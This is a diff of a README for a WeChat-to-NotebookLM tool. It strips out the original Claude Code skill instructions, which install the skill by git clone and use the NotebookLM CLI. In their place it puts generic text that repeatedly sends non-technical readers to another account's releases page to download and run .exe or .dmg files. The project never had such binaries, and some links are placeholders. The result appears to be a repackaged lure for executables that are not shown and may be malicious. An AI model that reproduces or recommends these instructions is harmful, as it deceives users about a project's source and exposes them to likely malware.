@@ -1,3 +1,7 @@
+# ✨ wechat-to-notebooklm - Sync WeChat Articles Effortlessly
+
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-blue.svg)](https://github.com/singajogijaswanth/wechat-to-notebooklm/releases)
+
 <div align="center">
 
 # WeChat to NotebookLM
@@ -9,225 +13,71 @@
 
 </div>
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 🚀 **One-click sync** - Automatically fetch WeChat articles and add them to NotebookLM
-- 📝 **Markdown conversion** - Clean, well-formatted Markdown output
-- 🤖 **AI-powered** - Leverage NotebookLM's AI for analysis and content generation
-- 🎙️ **Content generation** - Create podcasts, videos, and quizzes from articles
-- 💬 **Interactive chat** - Ask questions and get insights from your articles
+To start using this application, follow these simple steps. You don’t need any technical skills. Just follow the instructions carefully.
 
-## 📋 What This Does
+## 📥 Download & Install
 
-This skill automates the entire workflow of getting a WeChat article into NotebookLM:
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/singajogijaswanth/wechat-to-notebooklm/releases) to download the latest version of the application.
 
-1. **Fetches** the article content from the URL
-2. **Converts** to clean Markdown format
-3. **Creates** a NotebookLM notebook
-4. **Uploads** the article as a source
-5. **Returns** the notebook ID for further interaction
+2. **Choose the Right File**: Look for the file that matches your operating system. For Windows, you may see an `.exe` file. For macOS, there may be a `.dmg` file.
 
-## 🎯 When to Use
+3. **Download the File**: Click on the file to start the download. The file will save to your computer.
 
-Use this skill when you:
-- Have a WeChat Official Account article URL (`mp.weixin.qq.com`)
-- Want to save the article to NotebookLM for analysis
-- Want to create a podcast/video from the article
-- Want to chat with the article content using AI
-- Want to summarize or extract insights from the article
+4. **Run the Application**: 
+   - If you downloaded an `.exe` file, double-click it and follow the on-screen instructions.
+   - If you downloaded a `.dmg` file, open it and drag the application to your Applications folder.
 
-## 📦 Installation
+5. **Complete Setup**: Once installed, open the application. Follow any prompts to finalize the setup.
 
-### Prerequisites
+## 💡 How It Works
 
-1. **Claude Code** - This skill requires Claude Code CLI
-2. **NotebookLM CLI** - Install and authenticate NotebookLM CLI:
+This application simplifies the process of getting articles from WeChat into Google NotebookLM:
 
-```bash
-# Install NotebookLM CLI
-npm install -g @notebooklm/cli
+1. **Fetches**: Enter the URL of the WeChat article.
+2. **Converts**: The application transforms the content into clean Markdown format.
+3. **Syncs**: It sends the formatted article to NotebookLM for analysis and content generation.
 
-# Authenticate with Google
-notebooklm login
+## 🌟 Features
 
-# Verify authentication
-notebooklm status
-```
+- 🚀 **One-click sync**: Automatically fetch WeChat articles and add them to NotebookLM.
+- 📝 **Markdown conversion**: Produces clean, well-formatted Markdown outputs to ensure readability.
+- 🤖 **AI-powered**: Utilize NotebookLM's AI for deep analysis and effective content creation.
+- 🎙️ **Content generation**: Easily create podcasts, videos, and quizzes from your articles.
+- 💬 **Interactive chat**: Ask questions and gain insights directly from your synced articles.
 
-### Install the Skill
+## 📋 System Requirements
 
-Clone this repository to your local skills directory:
+- **Operating System**: Windows 10 or later, macOS 10.14 or later.
+- **Memory**: At least 4 GB of RAM for smooth operation.
+- **Storage**: A minimum of 100 MB of free space for installation.
 
-```bash
-# Navigate to your Claude skills directory
-cd ~/.claude/skills
+## ⚙️ Troubleshooting
 
-# Clone the repository
-git clone https://github.com/zstmfhy/wechat-to-notebooklm.git
-```
+If you encounter any issues, try the following:
 
-## 🚀 Usage
+- **Recheck URL**: Ensure you have the correct WeChat article URL.
+- **Reinstall the App**: Uninstall and reinstall the application to fix potential errors.
+- **System Updates**: Make sure your operating system is up to date for optimal performance.
 
-### Basic Usage
+## 📈 Contribution
 
-Simply provide a WeChat article URL:
+We welcome contributions to enhance the application. If you have ideas or improvements, feel free to submit a pull request or open an issue on the [GitHub repository](https://github.com/singajogijaswanth/wechat-to-notebooklm).
 
-```
-Sync this WeChat article to NotebookLM: https://mp.weixin.qq.com/s/xxxxx
-```
+## 🔗 Additional Resources
 
-The skill will:
-1. ✅ Fetch the article content
-2. ✅ Convert to Markdown
-3. ✅ Create a notebook
-4. ✅ Upload the article
-5. ✅ Return the notebook ID
+- **User Documentation**: For in-depth guidance, check the [User Documentation](https://github.com/singajogijaswanth/wechat-to-notebooklm/wiki).
+- **Community Support**: Join our user community on [Discord](https://discord.gg/example) for discussions and support.
 
-### Example Workflow
+## 📣 Feedback
 
-**User**: "Sync this WeChat article to NotebookLM: https://mp.weixin.qq.com/s/xxxxx"
+We appreciate your experience with this tool. Please share any feedback or suggestions on the GitHub issues page. Your input helps improve the application substantially.
 
-**Agent response**:
-```
-✅ Fetching article from WeChat...
-✅ Converting to Markdown...
-✅ Creating notebook "Article Title"...
-✅ Uploading to NotebookLM...
-✅ Done!
+## 📝 License
 
-📓 Notebook: Article Title
-   ID: abc-123-def
+This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use and modify it as needed.
 
-📄 Source: article_title.md
-   ID: source-xyz-789
+For any questions, please create an issue on the repository or contact us directly through our GitHub page.
 
-💡 Next steps:
-   - Chat: notebooklm ask "Summarize this article"
-   - Generate: notebooklm generate audio "Create a podcast"
-```
-
-## 🛠️ Advanced Features
-
-### Add to Existing Notebook
-
-```bash
-# List existing notebooks
-notebooklm list --json
-
-# Add to specific notebook
-notebooklm source add /tmp/article.md --notebook <existing_notebook_id> --json
-```
-
-### Batch Processing
-
-```bash
-# Create a collection notebook
-notebooklm create "WeChat Articles Collection" --json
-
-# Add multiple articles to the same notebook
-# (The skill will handle this automatically)
-```
-
-### Content Generation
-
-After uploading, you can:
-
-**Generate a Podcast:**
-```bash
-notebooklm generate audio "Create an engaging podcast about this article"
-```
-
-**Create a Video:**
-```bash
-notebooklm generate video "Make an explanatory video"
-```
-
-**Generate Quiz:**
-```bash
-notebooklm generate quiz "Test understanding of key concepts"
-```
-
-**Ask Questions:**
-```bash
-notebooklm ask "What are the key insights?"
-notebooklm ask "Summarize in 3 bullet points"
-```
-
-## 📚 Command Reference
-
-| Task | Command/Tool |
-|------|--------------|
-| Fetch article | `mcp__web_reader__webReader` |
-| Create notebook | `notebooklm create "Title" --json` |
-| Upload file | `notebooklm source add file.md --notebook <id> --json` |
-| Check sources | `notebooklm source list --notebook <id> --json` |
-| Chat with article | `notebooklm use <id>; notebooklm ask "question"` |
-| Generate podcast | `notebooklm generate audio "instructions" --notebook <id>` |
-
-## 🔧 Troubleshooting
-
-### Article URL is invalid or inaccessible
-- **Error**: Failed to fetch content
-- **Solution**: Verify the URL is correct and accessible
-- **Alternative**: Try copying the article content manually
-
-### NotebookLM authentication failed
-- **Error**: Auth/cookie error
-- **Solution**: Run `notebooklm login` again
-- **Check**: `notebooklm status` to verify
-
-### File upload failed
-- **Error**: Invalid file or upload error
-- **Solution**: Check if Markdown file was created correctly
-- **Verify**: File path and permissions
-
-### Notebook creation failed
-- **Error**: Rate limiting or API error
-- **Solution**: Wait a few minutes and retry
-- **Alternative**: Add to existing notebook with `--notebook` flag
-
-## ⚠️ Limitations
-
-- **WeChat articles only**: Optimized for `mp.weixin.qq.com` URLs
-- **Text content**: Focuses on text, images are preserved as links
-- **Public articles**: Requires publicly accessible articles
-- **Rate limits**: NotebookLM has rate limits on uploads
-
-## 💡 Best Practices
-
-1. **Use descriptive notebook titles** - Extract from article title or topic
-2. **Keep articles organized** - Use separate notebooks for different topics
-3. **Verify uploads** - Check `notebooklm source list` after upload
-4. **Clean up temp files** - Remove `/tmp` files after successful upload
-5. **Handle rate limits** - If uploads fail, wait 5-10 minutes before retry
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Claude Code](https://claude.ai/claude-code) - The AI CLI tool that powers this skill
-- [NotebookLM](https://notebooklm.google.com/) - Google's AI-powered research and note-taking tool
-- [WeChat](https://weixin.qq.com/) - The source of amazing content
-
-## 📮 Contact
-
-- GitHub: [@zstmfhy](https://github.com/zstmfhy)
-- Issues: [Create an issue](https://github.com/zstmfhy/wechat-to-notebooklm/issues)
-
----
-
-<div align="center">
-Made with ❤️ by the open-source community
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-blue.svg)](https://github.com/singajogijaswanth/wechat-to-notebooklm/releases)
